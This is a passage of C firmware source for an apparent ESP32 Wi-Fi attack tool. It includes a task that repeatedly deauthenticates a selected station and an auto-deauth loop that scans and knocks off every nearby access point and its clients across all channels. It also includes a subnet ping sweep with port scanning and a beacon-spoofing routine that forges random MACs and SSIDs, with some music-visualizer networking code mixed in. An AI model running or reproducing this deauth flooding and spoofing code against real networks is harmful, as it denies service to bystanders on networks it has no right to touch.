    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // switch to AP mode for deauth
    ESP_ERROR_CHECK(esp_wifi_start()); // restart Wi-Fi interface without HTTP server
    printf("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2], selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2], selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    TERMINAL_VIEW_ADD_TEXT("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2], selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2], selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    xTaskCreate(wifi_deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
    station_selected = false;
}

// Background task for deauthenticating a selected station and logging packet rate
static void wifi_deauth_station_task(void *param) {
    int deauth_channel = 1;
    wifi_second_chan_t second_chan;
    esp_err_t ch_err = esp_wifi_get_channel(&deauth_channel, &second_chan);
    if (ch_err != ESP_OK || deauth_channel < 1 || deauth_channel > SCANSTA_MAX_WIFI_CHANNEL) {
        deauth_channel = 1; // fallback channel
    }
    (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
    uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
    for (;;) {
        wifi_manager_broadcast_deauth(selected_station.ap_bssid, deauth_channel, selected_station.station_mac);
        vTaskDelay(pdMS_TO_TICKS(50));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            printf("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
            deauth_packets_sent = 0;
            last_log = now;
        }
    }
}

#define MAX_PAYLOAD 64
#define UDP_PORT 6677
#define TRACK_NAME_LEN 32
#define ARTIST_NAME_LEN 32
#define NUM_BARS 15

void screen_music_visualizer_task(void *pvParameters) {
    char rx_buffer[128];
    char track_name[TRACK_NAME_LEN + 1];
    char artist_name[ARTIST_NAME_LEN + 1];
    uint8_t amplitudes[NUM_BARS];

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(UDP_PORT);
    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        vTaskDelete(NULL);
        return;
    }

    printf("Socket created\n");

    int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (err < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        vTaskDelete(NULL);
        return;
    }

    printf("Socket bound, port %d\n", UDP_PORT);

    while (1) {
        printf("Waiting for data...\n");

        struct sockaddr_in6 source_addr;
        socklen_t socklen = sizeof(source_addr);

        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                           (struct sockaddr *)&source_addr, &socklen);
        if (len < 0) {
            printf("recvfrom failed: errno %d\n", errno);
            break;
        }

        rx_buffer[len] = '\0';

        if (len >= TRACK_NAME_LEN + ARTIST_NAME_LEN + NUM_BARS) {

            memcpy(track_name, rx_buffer, TRACK_NAME_LEN);
            track_name[TRACK_NAME_LEN] = '\0';

            memcpy(artist_name, rx_buffer + TRACK_NAME_LEN, ARTIST_NAME_LEN);
            artist_name[ARTIST_NAME_LEN] = '\0';

            memcpy(amplitudes, rx_buffer + TRACK_NAME_LEN + ARTIST_NAME_LEN, NUM_BARS);

#ifdef WITH_SCREEN
            music_visualizer_view_update(amplitudes, track_name, artist_name);
#endif
        } else {
            printf("Received packet of unexpected size\n");
        }
    }

    if (sock != -1) {
        printf("Shutting down socket and restarting...\n");
        shutdown(sock, 0);
        close(sock);
    }

    vTaskDelete(NULL);
}

void animate_led_based_on_amplitude(void *pvParameters) {
    char rx_buffer[128];
    char addr_str[128];
    int addr_family = AF_INET;
    int ip_protocol = IPPROTO_IP;
    struct sockaddr_in dest_addr;

    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dest_addr.sin_family = addr_family;
    dest_addr.sin_port = htons(UDP_PORT);

    int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        return;
    }
    printf("Socket created\n");

    if (bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        return;
    }
    printf("Socket bound, port %d\n", UDP_PORT);

    float amplitude = 0.0f;
    float last_amplitude = 0.0f;
    float smoothing_factor = 0.1f;
    int hue = 0;

    while (1) {
        struct sockaddr_in source_addr;
        socklen_t socklen = sizeof(source_addr);
        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, MSG_DONTWAIT,
                           (struct sockaddr *)&source_addr, &socklen);

        if (len > 0) {
            rx_buffer[len] = '\0';
            inet_ntoa_r(source_addr.sin_addr, addr_str, sizeof(addr_str) - 1);
            printf("Received %d bytes from %s: %s\n", len, addr_str, rx_buffer);

            amplitude = atof(rx_buffer);
            amplitude = fmaxf(0.0f, fminf(amplitude, 1.0f)); // Clamp between 0.0 and 1.0

            // Smooth amplitude to avoid sudden changes (optional)
            amplitude =
                (smoothing_factor * amplitude) + ((1.0f - smoothing_factor) * last_amplitude);
            last_amplitude = amplitude;
        } else {
            // Gradually decrease amplitude when no data is received
            amplitude = last_amplitude * 0.9f; // Adjust decay rate as needed
            last_amplitude = amplitude;
        }

        // Ensure amplitude doesn't go below zero
        amplitude = fmaxf(0.0f, amplitude);

        hue = (int)(amplitude * 360) % 360;

        float h = hue / 60.0f;
        float s = 1.0f;
        float v = amplitude;

        int i = (int)h % 6;
        float f = h - (int)h;
        float p = v * (1.0f - s);
        float q = v * (1.0f - f * s);
        float t = v * (1.0f - (1.0f - f) * s);

        float r = 0.0f, g = 0.0f, b = 0.0f;
        switch (i) {
        case 0:
            r = v;
            g = t;
            b = p;
            break;
        case 1:
            r = q;
            g = v;
            b = p;
            break;
        case 2:
            r = p;
            g = v;
            b = t;
            break;
        case 3:
            r = p;
            g = q;
            b = v;
            break;
        case 4:
            r = t;
            g = p;
            b = v;
            break;
        case 5:
            r = v;
            g = p;
            b = q;
            break;
        }

        uint8_t red = (uint8_t)(r * 255);
        uint8_t green = (uint8_t)(g * 255);
        uint8_t blue = (uint8_t)(b * 255);

        esp_err_t ret = rgb_manager_set_color(&rgb_manager, 0, red, green, blue, false);
        if (ret != ESP_OK) {
            printf("Failed to set color\n");
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (sock != -1) {
        printf("Shutting down socket...\n");
        shutdown(sock, 0);
        close(sock);
    }
}

#define START_HOST 1
#define END_HOST 254
#define SCAN_TIMEOUT_MS 100
#define HOST_TIMEOUT_MS 100
#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT BIT1
#define MAX_OPEN_PORTS 64

uint16_t calculate_checksum(uint16_t *addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

bool get_subnet_prefix(scanner_ctx_t *ctx) {
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        printf("Failed to get WiFi interface\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get WiFi interface\n");
        return false;
    }

    // Check if WiFi is connected
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        printf("WiFi is not connected\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi is not connected\n");
        return false;
    }

    // Get IP info
    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) {
        printf("Failed to get IP info\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get IP info\n");
        return false;
    }

    uint32_t network = ip_info.ip.addr & ip_info.netmask.addr;
    struct in_addr network_addr;
    network_addr.s_addr = network;

    char *network_str = inet_ntoa(network_addr);
    char *last_dot = strrchr(network_str, '.');
    if (last_dot == NULL) {
        printf("Invalid network address format\n");
        TERMINAL_VIEW_ADD_TEXT("Invalid network address format\n");
        return false;
    }

    size_t prefix_len = last_dot - network_str + 1;
    memcpy(ctx->subnet_prefix, network_str, prefix_len);
    ctx->subnet_prefix[prefix_len] = '\0';

    printf("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    return true;
}

bool is_host_active(const char *ip_addr) {
    struct sockaddr_in addr;
    int sock;
    struct timeval timeout;
    fd_set readset;
    uint8_t buf[sizeof(icmp_packet_t)];
    bool is_active = false;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0)
        return false;

    // Prepare ICMP packet
    icmp_packet_t *icmp = (icmp_packet_t *)buf;
    icmp->type = 8; // ICMP Echo Request
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->id = 0xAFAF;
    icmp->seqno = htons(1);
    icmp->checksum = calculate_checksum((uint16_t *)icmp, sizeof(icmp_packet_t));

    addr.sin_family = AF_INET;
    inet_pton(AF_INET, ip_addr, &addr.sin_addr.s_addr);

    sendto(sock, buf, sizeof(icmp_packet_t), 0, (struct sockaddr *)&addr, sizeof(addr));

    timeout.tv_sec = HOST_TIMEOUT_MS / 1000;
    timeout.tv_usec = (HOST_TIMEOUT_MS % 1000) * 1000;

    FD_ZERO(&readset);
    FD_SET(sock, &readset);

    if (select(sock + 1, &readset, NULL, NULL, &timeout) > 0) {
        is_active = true;
    }

    close(sock);
    return is_active;
}

scanner_ctx_t *scanner_init(void) {
    scanner_ctx_t *ctx = malloc(sizeof(scanner_ctx_t));
    if (!ctx)
        return NULL;

    ctx->results = malloc(sizeof(host_result_t) * END_HOST);
    if (!ctx->results) {
        free(ctx);
        return NULL;
    }

    ctx->max_results = END_HOST;
    ctx->num_active_hosts = 0;
    ctx->subnet_prefix[0] = '\0';

    return ctx;
}

void scan_ports_on_host(const char *target_ip, host_result_t *result) {
    struct sockaddr_in server_addr;
    int sock;
    int scan_result;
    struct timeval timeout;
    fd_set fdset;
    int flags;

    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);

    printf("Scanning host: %s\n", target_ip);
    TERMINAL_VIEW_ADD_TEXT("Scanning host: %s\n", target_ip);

    for (size_t i = 0; i < NUM_PORTS; i++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS)
            break;

        uint16_t port = COMMON_PORTS[i];
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0)
            continue;

        flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        server_addr.sin_port = htons(port);
        scan_result = connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

        if (scan_result < 0 && errno == EINPROGRESS) {
            timeout.tv_sec = SCAN_TIMEOUT_MS / 1000;
            timeout.tv_usec = (SCAN_TIMEOUT_MS % 1000) * 1000;

            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);

            scan_result = select(sock + 1, NULL, &fdset, NULL, &timeout);

            if (scan_result > 0) {
                int error = 0;
                socklen_t len = sizeof(error);
                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
                    result->open_ports[result->num_open_ports++] = port;
                    printf("%s - Port %d is OPEN\n", target_ip, port);
                    TERMINAL_VIEW_ADD_TEXT("%s - Port %d is OPEN\n", target_ip, port);
                }
            }
        }

        close(sock);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

void scanner_cleanup(scanner_ctx_t *ctx) {
    if (ctx) {
        if (ctx->results) {
            free(ctx->results);
        }
        free(ctx);
    }
}

bool wifi_manager_scan_subnet() {
    scanner_ctx_t *ctx = scanner_init();
    if (!ctx) {
        printf("Failed to initialize scanner context\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
        return false;
    }

    if (!get_subnet_prefix(ctx)) {
        printf("Failed to get network information. Make sure WiFi is connected.\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get network information. Make sure WiFi is connected.\n");
        scanner_cleanup(ctx);
        return false;
    }

    char current_ip[26];
    ctx->num_active_hosts = 0;

    printf("Starting subnet scan on %s0/24\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT("Starting subnet scan on %s0/24\n", ctx->subnet_prefix);

    for (int host = START_HOST; host <= END_HOST; host++) {
        snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);

        if (is_host_active(current_ip)) {
            printf("Found active host: %s\n", current_ip);
            TERMINAL_VIEW_ADD_TEXT("Found active host: %s\n", current_ip);
            scan_ports_on_host(current_ip, &ctx->results[ctx->num_active_hosts]);
            ctx->num_active_hosts++;
        }
    }

    printf("Scan completed. Found %d active hosts:\n", ctx->num_active_hosts);
    TERMINAL_VIEW_ADD_TEXT("Scan completed. Found %d active hosts:\n", ctx->num_active_hosts);

    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
        if (ctx->results[i].num_open_ports > 0) {
            printf("Host %s has %d open ports:\n", ctx->results[i].ip,
                   ctx->results[i].num_open_ports);
            TERMINAL_VIEW_ADD_TEXT("Host %s has %d open ports:\n", ctx->results[i].ip,
                                   ctx->results[i].num_open_ports);

            printf("Possible services/devices:\n");
            TERMINAL_VIEW_ADD_TEXT("Possible services/devices:\n");

            for (uint8_t j = 0; j < ctx->results[i].num_open_ports; j++) {
                uint16_t port = ctx->results[i].open_ports[j];
                printf("  - Port %d: ", port);
                TERMINAL_VIEW_ADD_TEXT("  - Port %d: ", port);

                switch (port) {
                case 20:
                case 21:
                    printf("FTP Server\n");
                    TERMINAL_VIEW_ADD_TEXT("FTP Server\n");
                    break;
                case 22:
                case 2222:
                    printf("SSH Server\n");
                    TERMINAL_VIEW_ADD_TEXT("SSH Server\n");
                    break;
                case 23:
                    printf("Telnet Server\n");
                    TERMINAL_VIEW_ADD_TEXT("Telnet Server\n");
                    break;
                case 80:
                case 8080:
                case 8443:
                case 443:
                    printf("Web Server\n");
                    TERMINAL_VIEW_ADD_TEXT("Web Server\n");
                    break;
                case 445:
                case 139:
                    printf("Windows File Share/Domain Controller\n");
                    TERMINAL_VIEW_ADD_TEXT("Windows File Share/Domain Controller\n");
                    break;
                case 3389:
                    printf("Windows Remote Desktop\n");
                    TERMINAL_VIEW_ADD_TEXT("Windows Remote Desktop\n");
                    break;
                case 5900:
                case 5901:
                case 5902:
                    printf("VNC Remote Access\n");
                    TERMINAL_VIEW_ADD_TEXT("VNC Remote Access\n");
                    break;
                case 1521:
                    printf("Oracle Database\n");
                    TERMINAL_VIEW_ADD_TEXT("Oracle Database\n");
                    break;
                case 3306:
                    printf("MySQL Database\n");
                    TERMINAL_VIEW_ADD_TEXT("MySQL Database\n");
                    break;
                case 5432:
                    printf("PostgreSQL Database\n");
                    TERMINAL_VIEW_ADD_TEXT("PostgreSQL Database\n");
                    break;
                case 27017:
                    printf("MongoDB Database\n");
                    TERMINAL_VIEW_ADD_TEXT("MongoDB Database\n");
                    break;
                case 9100:
                    printf("Network Printer\n");
                    TERMINAL_VIEW_ADD_TEXT("Network Printer\n");
                    break;
                case 32400:
                    printf("Plex Media Server\n");
                    TERMINAL_VIEW_ADD_TEXT("Plex Media Server\n");
                    break;
                case 2082:
                case 2083:
                case 2086:
                case 2087:
                    printf("Web Hosting Control Panel\n");
                    TERMINAL_VIEW_ADD_TEXT("Web Hosting Control Panel\n");
                    break;
                case 6379:
                    printf("Redis Server\n");
                    TERMINAL_VIEW_ADD_TEXT("Redis Server\n");
                    break;
                case 1883:
                case 8883:
                    printf("IoT Device (MQTT)\n");
                    TERMINAL_VIEW_ADD_TEXT("IoT Device (MQTT)\n");
                    break;
                default:
                    printf("Unknown Service\n");
                    TERMINAL_VIEW_ADD_TEXT("Unknown Service\n");
                }
            }

            bool has_web = false;
            bool has_db = false;
            bool has_file_sharing = false;

            for (uint8_t j = 0; j < ctx->results[i].num_open_ports; j++) {
                uint16_t port = ctx->results[i].open_ports[j];
                if (port == 80 || port == 443 || port == 8080 || port == 8443)
                    has_web = true;
                if (port == 3306 || port == 5432 || port == 1521 || port == 27017)
                    has_db = true;
                if (port == 445 || port == 139)
                    has_file_sharing = true;
            }

            printf("\nPossible device type:\n");
            TERMINAL_VIEW_ADD_TEXT("\nPossible device type:\n");

            if (has_web && has_db) {
                printf("- Web Application Server\n");
                TERMINAL_VIEW_ADD_TEXT("- Web Application Server\n");
            }
            if (has_file_sharing) {
                printf("- Windows Server\n");
                TERMINAL_VIEW_ADD_TEXT("- Windows Server\n");
            }
            printf("\n");
            TERMINAL_VIEW_ADD_TEXT("\n");
        }
    }

    scanner_cleanup(ctx);
    return true;
}

bool scan_ip_port_range(const char *target_ip, uint16_t start_port, uint16_t end_port) {
    scanner_ctx_t *ctx = scanner_init();
    if (!ctx) {
        printf("Failed to initialize scanner context\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
        return false;
    }

    ctx->num_active_hosts = 1;
    host_result_t *result = &ctx->results[0];
    strcpy(result->ip, target_ip);
    result->num_open_ports = 0;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);

    printf("Scanning %s ports %d-%d\n", target_ip, start_port, end_port);
    TERMINAL_VIEW_ADD_TEXT("Scanning %s ports %d-%d\n", target_ip, start_port, end_port);

    uint16_t ports_scanned = 0;
    uint16_t total_ports = end_port - start_port + 1;

    for (uint16_t port = start_port; port <= end_port; port++) {
        if (result->num_open_ports >= MAX_OPEN_PORTS)
            break;

        ports_scanned++;
        if (ports_scanned % 100 == 0) {
            printf("Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned, total_ports,
                   (float)ports_scanned / total_ports * 100);
            TERMINAL_VIEW_ADD_TEXT("Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned,
                                   total_ports, (float)ports_scanned / total_ports * 100);
        }

        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0)
            continue;

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        server_addr.sin_port = htons(port);
        int scan_result = connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

        if (scan_result < 0 && errno == EINPROGRESS) {
            struct timeval timeout = {.tv_sec = SCAN_TIMEOUT_MS / 1000,
                                      .tv_usec = (SCAN_TIMEOUT_MS % 1000) * 1000};
            fd_set fdset;
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);

            if (select(sock + 1, NULL, &fdset, NULL, &timeout) > 0) {
                int error = 0;
                socklen_t len = sizeof(error);
                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
                    result->open_ports[result->num_open_ports++] = port;
                    printf("%s - Port %d is OPEN\n", target_ip, port);
                    TERMINAL_VIEW_ADD_TEXT("%s - Port %d is OPEN\n", target_ip, port);
                }
            }
        }
        close(sock);
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
        if (ctx->results[i].num_open_ports > 0) {
            printf("Host %s has %d open ports:\n", ctx->results[i].ip,
                   ctx->results[i].num_open_ports);
            TERMINAL_VIEW_ADD_TEXT("Host %s has %d open ports:\n", ctx->results[i].ip,
                                   ctx->results[i].num_open_ports);
        }
    }

    scanner_cleanup(ctx);
    return true;
}

void wifi_manager_scan_for_open_ports() { wifi_manager_scan_subnet(); }

void rgb_visualizer_server_task(void *pvParameters) {
    char rx_buffer[MAX_PAYLOAD];
    char addr_str[128];
    int addr_family;
    int ip_protocol;

    while (1) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(UDP_PORT);
        addr_family = AF_INET;
        ip_protocol = IPPROTO_IP;
        inet_ntoa_r(dest_addr.sin_addr, addr_str, sizeof(addr_str) - 1);

        int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) {
            printf("Unable to create socket: errno %d\n", errno);
            break;
        }
        printf("Socket created\n");

        int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err < 0) {
            printf("Socket unable to bind: errno %d\n", errno);
        }
        printf("Socket bound, port %d\n", UDP_PORT);

        while (1) {
            printf("Waiting for data\n");
            struct sockaddr_in6 source_addr;
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                               (struct sockaddr *)&source_addr, &socklen);

            if (len < 0) {
                printf("recvfrom failed: errno %d\n", errno);
                break;
            } else {
                // Data received
                rx_buffer[len] = 0; // Null-terminate

                // Process the received data
                uint8_t *amplitudes = (uint8_t *)rx_buffer;
                size_t num_bars = len;
                update_led_visualizer(amplitudes, num_bars, false);
            }
        }

        if (sock != -1) {
            printf("Shutting down socket and restarting...\n");
            shutdown(sock, 0);
            close(sock);
        }
    }

    vTaskDelete(NULL);
}

void wifi_auto_deauth_task(void *Parameter) {
    while (1) {
        wifi_scan_config_t scan_config = {
            .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true};

        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
        vTaskDelay(pdMS_TO_TICKS(1500));
        esp_wifi_scan_stop();

        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));

        if (ap_count > 0) {
            scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
            if (scanned_aps == NULL) {
                printf("Failed to allocate memory for AP info\n");
                continue;
            }

            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
            printf("\nFound %d access points\n", ap_count);
            TERMINAL_VIEW_ADD_TEXT("\nFound %d access points\n", ap_count);
        } else {
            printf("\nNo access points found\n");
            TERMINAL_VIEW_ADD_TEXT("\nNo access points found\n");
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait before retrying if no APs found
            continue;
        }

        wifi_ap_record_t *ap_info = scanned_aps;
        if (ap_info == NULL) {
            printf("Failed to allocate memory for AP info\n");
            return;
        }

        for (int z = 0; z < 50; z++) {
            for (int i = 0; i < ap_count; i++) {
                for (int y = 1; y < 12; y++) {
                    int retry_count = 0;
                    esp_err_t err;
                    while (retry_count < 3) {
                        err = esp_wifi_set_channel(y, WIFI_SECOND_CHAN_NONE);
                        if (err == ESP_OK) {
                            break;
                        }
                        printf("Failed to set channel %d, retry %d\n", y, retry_count + 1);
                        vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between retries
                        retry_count++;
                    }

                    if (err != ESP_OK) {
                        printf("Failed to set channel after retries, skipping...\n");
                        continue; // Skip this channel if all retries failed
                    }

                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                            wifi_manager_broadcast_deauth(ap_info[i].bssid, y, station_ap_list[j].station_mac);
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(50));
                }
                vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between APs
            }
            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between cycles
        }

        free(scanned_aps);
        vTaskDelay(pdMS_TO_TICKS(1000)); // 1000ms delay before starting next scan
    }
}

void wifi_manager_auto_deauth() {
    printf("Starting auto deauth transmission...\n");
    wifi_auto_deauth_task(NULL);
}

void wifi_manager_stop_deauth() {
    if (beacon_task_running) {
        printf("Stopping deauth transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...\n");
        if (deauth_task_handle != NULL) {
            vTaskDelete(deauth_task_handle);
            deauth_task_handle = NULL;
            beacon_task_running = false;
            rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
            wifi_manager_stop_monitor_mode();
            esp_wifi_stop();
            ap_manager_start_services();
        }
    }
}

// Print the scan results and match BSSID to known companies
void wifi_manager_print_scan_results_with_oui() {
    if (scanned_aps == NULL) {
        printf("AP information not available\n");
        TERMINAL_VIEW_ADD_TEXT("AP information not available\n");
        return;
    }

    for (uint16_t i = 0; i < ap_count; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

        ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
        const char *company_str = "Unknown";
        switch (company) {
        case COMPANY_DLINK:
            company_str = "DLink";
            break;
        case COMPANY_NETGEAR:
            company_str = "Netgear";
            break;
        case COMPANY_BELKIN:
            company_str = "Belkin";
            break;
        case COMPANY_TPLINK:
            company_str = "TPLink";
            break;
        case COMPANY_LINKSYS:
            company_str = "Linksys";
            break;
        case COMPANY_ASUS:
            company_str = "ASUS";
            break;
        case COMPANY_ACTIONTEC:
            company_str = "Actiontec";
            break;
        default:
            company_str = "Unknown";
            break;
        }

        // Print access point information including BSSID
        printf("[%u] SSID: %s,\n"
               "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
               "     RSSI: %d,\n",
               i, sanitized_ssid, 
               scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
               scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
               scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
               scanned_aps[i].rssi);
#ifdef CONFIG_IDF_TARGET_ESP32C5
        {
            int ch = scanned_aps[i].primary;
            const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
            printf("      Band: %s,\n", band_str);
        }
#endif
        printf("     Company: %s\n", company_str);

        // Log information in terminal view including BSSID
        TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
                               "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
                               "     RSSI: %d,\n",
                               i, sanitized_ssid, 
                               scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
                               scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
                               scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
                               scanned_aps[i].rssi);
#ifdef CONFIG_IDF_TARGET_ESP32C5
        {
            int ch = scanned_aps[i].primary;
            const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
            TERMINAL_VIEW_ADD_TEXT("      Band: %s,\n", band_str);
        }
#endif
        TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
    }
}

esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
    uint8_t packet[256] = {
        0x80, 0x00, 0x00, 0x00,                         // Frame Control, Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination address (broadcast)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source address (randomized later)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // BSSID (randomized later)
        0xc0, 0x6c,                                     // Seq-ctl (sequence control)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (set to 0)
        0x64, 0x00,                                     // Beacon interval (100 TU)
        0x11, 0x04,                                     // Capability info (ESS)
    };

    for (int ch = 1; ch <= 11; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        generate_random_mac(&packet[10]);
        memcpy(&packet[16], &packet[10], 6);

        char ssid_buffer[RANDOM_SSID_LEN + 1];
        if (ssid == NULL) {
            generate_random_ssid(ssid_buffer, RANDOM_SSID_LEN + 1);
            ssid = ssid_buffer;
        }

        uint8_t ssid_len = strlen(ssid);
        packet[37] = ssid_len;
        memcpy(&packet[38], ssid, ssid_len);

        uint8_t *supported_rates_ie = &packet[38 + ssid_len];
        supported_rates_ie[0] = 0x01; // Supported Rates IE tag
        supported_rates_ie[1] = 0x08; // Length (8 rates)
        supported_rates_ie[2] = 0x82; // 1 Mbps
        supported_rates_ie[3] = 0x84; // 2 Mbps
        supported_rates_ie[4] = 0x8B; // 5.5 Mbps
        supported_rates_ie[5] = 0x96; // 11 Mbps
        supported_rates_ie[6] = 0x24; // 18 Mbps
        supported_rates_ie[7] = 0x30; // 24 Mbps
        supported_rates_ie[8] = 0x48; // 36 Mbps
        supported_rates_ie[9] = 0x6C; // 54 Mbps

        uint8_t *ds_param_set_ie = &supported_rates_ie[10];
        ds_param_set_ie[0] = 0x03; // DS Parameter Set IE tag
        ds_param_set_ie[1] = 0x01; // Length (1 byte)

        uint8_t primary_channel;
        wifi_second_chan_t second_channel;
